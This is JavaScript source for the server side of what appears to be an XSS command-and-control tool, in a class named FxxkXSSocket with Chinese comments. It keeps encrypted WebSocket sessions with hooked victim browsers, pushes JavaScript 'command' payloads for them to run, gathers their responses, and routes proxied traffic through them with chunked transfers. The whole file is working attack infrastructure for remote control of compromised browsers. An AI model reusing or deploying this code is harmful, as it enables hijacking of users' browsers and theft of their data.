import { getSecureKey, generateNewLog, decrypt, encrypt } from '../utils/index.js';
import { proxy_domain, proxy_timeout } from '../conf.js';

export default class FxxkXSSocket {
    constructor(id, ws, req){
        this.id = id;
        this.isAlive = true;
        this.logs = [];
        this.log_hook = [];
        this.ws = ws;

        this.key = getSecureKey();
        ws.send(this.key);

        this.proxy_domain = `协议.端口.目标域名.s${id}.${proxy_domain()}`;
        this.proxy_list = [];                                                    //流量转发列表
        this.proxy_seq = 0,                                                      //流量转发序号
        this.proxy_server = `s${id}`                                             //转发服务器名
        this.proxy_current_index = 0;

        this.remoteAddress = req.socket.remoteAddress;
        this.remoteUrl = req.headers.origin;
        //启动监听
        ws.on('message', async message => {
            //先解密
            try{
                message = JSON.parse(decrypt(message, this.key));
                //普通消息直接转发到渲染进程里去，同步消息则处理同步消息队列
                if(message['type'] === 'normal'){
                    this.addLog(generateNewLog('XSS', message['data'], 'white'));
                }else if(message['type'] === 'async'){
                    /**
                     * 这里强调一下数据结构，对于同步消息，message['data']是一个JSON，结构为 { index : number, text : string, fin : bool }
                     * 其中index用于标记当前传输是第index传输，fin用于表示是否传输完成，同时浏览器在第一次发送payload的时候会挂载一个回调，用于处理第n次传输
                     * 所以在第index次传输完成以后，如果fin为false，那么我们就需要发送一个payload用于触发这个回调，启动第index + 1次传输
                     */
                    for(const i in this.proxy_list){
                        //先获取到是哪一条消息
                        if(this.proxy_list[i].seq === message['id']){
                            //然后解析JSON
                            const temp = JSON.parse(message['data']);
                            this.proxy_list[i].response += temp['text'];
                            //如果fin了就表示分片传输传完了，如果没传完就给客户端发一个表示可以继续传输的消息
                            if(temp['fin']){
                                this.proxy_list[i].callback();
                            }else{
                                //启动第 index + 1次传输
                                const payload = `window.cachex.next$cb${message['id']}(${temp['index'] + 1});`;
                                ws.send(encrypt(JSON.stringify({
                                    type : 'command',
                                    data : payload
                                }), this.key));
                            }
                            break;
                        }
                    }
                }
            }catch(e){
                //有可能出现消息发到一半密钥更新了的情况，这个时候会解密错误，我已经给出了 60 ~ 316秒的时间用于消息传输，如果出问题的话最好使用分块传输
                this.addLog(generateNewLog('DECRYPT', 'decrypt error', 'red'));
            }
        });
        ws.on('close', () => {
            this.isAlive = false;
        });
    }

    removeLogHook(f){
        for(let i in this.log_hook){
            if(this.log_hook[i] === f){
                this.log_hook.splice(i, 1);
                break;
            }
        }
    }

    addLogHook(f){
        this.log_hook.push(f);
    }

    addLog(str){
        this.log_hook.forEach(f => {
            typeof f === 'function' && f(str);
        });
        this.logs.push(str);
    }

    /**
     * @param start 
     * @param len 
     * @param sort asc or desc
     */
    getLogs(start, len, sort){
        sort = ['asc', 'desc'].includes(sort) ? sort : 'asc';
        if(sort === 'asc'){
            return this.logs.slice(start, start + len);
        }else{
            return this.logs.reverse().slice(start, start + len);
        }
    }

    /**
     * 只管发不管结果
     * 
     * @param {*} data 
     */
    sendPayloadSync(data){
        this.isAlive && this.ws.send(encrypt(JSON.stringify({
            type : 'command',
            data : data
        }), this.key));
    }

    /**
     * 即管发又管收
     * @param {Function} payload 
     * @returns 
     */
    applyRunPayload(payload){
        return new Promise(resolve => {
            const handler = async () => {
                const seq = this.proxy_seq++;
                this.ws.send(encrypt(JSON.stringify({
                    type : 'command',
                    data : payload(seq)
                }), this.key));
                const proxy = {
                    response : '',
                    seq : seq,
                    callback(){
                        resolve(proxy.response);
                        clearTimeout(proxy.timer);
                        for(const j in this.proxy_list){
                            if(this.proxy_list[j].seq === seq){
                                this.proxy_list.splice(j, 1);
                                break;
                            }
                        }
                        //执行完当前代理后启动下一个代理请求，如果不存在下一个了，那就说明处理完了
                        this.proxy_current_index++;
                        if(this.proxy_list[this.proxy_current_index]){
                            this.proxy_list[this.proxy_current_index]();
                        }
                    },
                    //处理超时，超时后先回应promise，然后删掉这个proxy
                    timer : setTimeout(() => {
                        resolve('timeout');
                        for(const j in this.proxy_list){
                            if(this.proxy_list[j].seq === seq){
                                this.proxy_list.splice(j, 1);
                                break;
                            }
                        }
                    }, proxy_timeout())
                };
                this.proxy_list.push(proxy);
            }
            this.proxy_list.push(handler);
            //如果还没处理完，则只推入队列，如果处理完了，推入队列的同时启动代理请求
            if(this.proxy_current_index === this.proxy_list.length - 1){
                handler();
            }
        });
    }

    getId(){
        return this.id;
    }

    getServerName(){
        return this.proxy_server;
    }

    getAlive(){
        return this.isAlive;
    }
}